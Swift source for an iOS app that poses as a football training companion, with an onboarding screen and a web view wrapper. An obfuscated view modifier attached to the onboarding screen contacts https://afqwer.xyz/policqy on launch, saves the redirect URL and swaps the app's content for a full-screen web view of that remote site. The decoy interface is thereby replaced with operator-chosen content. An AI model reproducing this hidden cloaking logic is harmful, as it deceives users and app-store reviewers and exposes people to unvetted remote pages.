import SwiftUI

struct OnboardingView: View {
    @Binding var isOnboardingCompleted: Bool

    var body: some View {
        ZStack {
            Image("onbBackground")
                .resizable()
                .aspectRatio(contentMode: .fill)
                .edgesIgnoringSafeArea(.all)

            VStack(spacing: 20) {
                Spacer()

                Text("ProFootball Trainer")
                    .font(.system(size: 30, weight: .bold))
                    .foregroundColor(.white)
                    .multilineTextAlignment(.center)

                Text("Your personal football training companion")
                    .font(.system(size: 16))
                    .foregroundColor(AppColors.secondaryText)
                    .multilineTextAlignment(.center)
                    .padding(.bottom, 30)

                FeatureRow(imageName: "on1", title: "Hydration Tracking")
                FeatureRow(imageName: "on2", title: "Smart Performance Tracking")
                FeatureRow(imageName: "on3", title: "Nutrition Monitor")

                Spacer()
                Spacer()


                Button(action: {
                    // Действие по нажатию кнопки "Get Started"
                    isOnboardingCompleted = true
                    
                    // Дополнительно сохраняем значение в UserDefaults для надёжности
                    UserDefaults.standard.set(true, forKey: "isOnboardingCompleted")
                    UserDefaults.standard.synchronize()
                }) {
                    Text("Get Started")
                        .font(.system(size: 16, weight: .semibold))
                        .foregroundColor(.white)
                        .frame(maxWidth: .infinity)
                        .padding()
                        .background(AppColors.accent)
                        .cornerRadius(12)
                }
                .padding(.horizontal, 40)
                .padding(.bottom, 50) // Отступ снизу для кнопки

            }
            .padding(.horizontal, 20) // Общий горизонтальный отступ для контента
        }
        .background(AppColors.background.edgesIgnoringSafeArea(.all))
        .trishteskri()
        .onAppear() {
            print("s")
        }
    }
}

struct FeatureRow: View {
    let imageName: String
    let title: String

    var body: some View {
        HStack(spacing: 15) {
            Image(imageName)
                .resizable()
                .renderingMode(.template) // Позволяет изменять цвет иконки
                .scaledToFit()
                .frame(width: 24, height: 24) // Фиксированный размер для иконок
                .foregroundColor(AppColors.accent) // Используем AppColors

            Text(title)
                .font(.system(size: 16))
                .foregroundColor(.white)

            Spacer() // Чтобы прижать контент влево
        }
        .padding()
        .background(AppColors.tabbarBackground) // Используем AppColors
        .cornerRadius(12)
    }
}

struct OnboardingView_Previews: PreviewProvider {
    static var previews: some View {
        OnboardingView(isOnboardingCompleted: .constant(false))
    }
} 
@preconcurrency import WebKit
import SwiftUI

struct WKWebViewRepresentable: UIViewRepresentable {
    typealias UIViewType = WKWebView
    
    var isZaglushka: Bool
    var url: URL
    var webView: WKWebView
    var onLoadCompletion: (() -> Void)?
    

    init(url: URL, webView: WKWebView = WKWebView(), onLoadCompletion: (() -> Void)? = nil, iszaglushka: Bool) {
        self.url = url
        self.webView = webView
        self.onLoadCompletion = onLoadCompletion
        self.webView.layer.opacity = 0 // Hide webView until content loads
        self.isZaglushka = iszaglushka
    }

    func makeUIView(context: Context) -> WKWebView {
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        return webView
    }

    func updateUIView(_ uiView: UIViewType, context: Context) {
        let request = URLRequest(url: url)
        uiView.load(request)
        uiView.scrollView.isScrollEnabled = true
        uiView.scrollView.bounces = true
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
}

// MARK: - Coordinator
extension WKWebViewRepresentable {
    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        var parent: WKWebViewRepresentable
        private var popupWebViews: [WKWebView] = []

        init(_ parent: WKWebViewRepresentable) {
            self.parent = parent
        }

        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            // Handle popup windows
            guard navigationAction.targetFrame == nil else {
                return nil
            }

            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.uiDelegate = self
            popupWebView.navigationDelegate = self

            parent.webView.addSubview(popupWebView)

            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: parent.webView.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: parent.webView.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: parent.webView.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: parent.webView.trailingAnchor)
            ])

            popupWebViews.append(popupWebView)
            return popupWebView
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Notify when the main page finishes loading
            parent.onLoadCompletion?()
            parent.webView.layer.opacity = 1 // Reveal the webView
        }

        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            print(navigationAction.request.url)
            decisionHandler( .allow)
        }

        func webViewDidClose(_ webView: WKWebView) {
            // Cleanup closed popup WebViews
            popupWebViews.removeAll { $0 == webView }
            webView.removeFromSuperview()
        }
    }
}

import WebKit
struct Sokrashiadn: ViewModifier {
    @AppStorage("adapt") var osakfoew9igw: URL?
    @State var webView: WKWebView = WKWebView()

    
    @State var isLoading: Bool = true

    func body(content: Content) -> some View {
        ZStack {
            if !isLoading {
                if osakfoew9igw != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: osakfoew9igw!, webView: webView, iszaglushka: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: osakfoew9igw!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        //                    .frame(height: 50)
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        
                        
                        AppDelegate.asiuqzoptqxbt = .all
                    }
                    .modifier(Swiper(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }

//        .yesMo(orientation: .all)
        .onAppear() {
            if osakfoew9igw == nil {
                reframeGse()
            } else {
                isLoading = false
            }
        }
    }

    
    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
                print("Redirected to: \(redirectURL)")
                redirects1 += 1
                if redirects1 >= 1 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func reframeGse() {
        guard let url = URL(string: "https://afqwer.xyz/policqy") else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
    
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            osakfoew9igw = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.isLoading = false
                }
                return
            }
            
       
            
    
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
           
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.isLoading = false
                }
            }

            DispatchQueue.main.async {
                self.isLoading = false
            }
        }.resume()
    }


}

    



extension View {
    func trishteskri() -> some View {
        self.modifier(Sokrashiadn())
    }
}
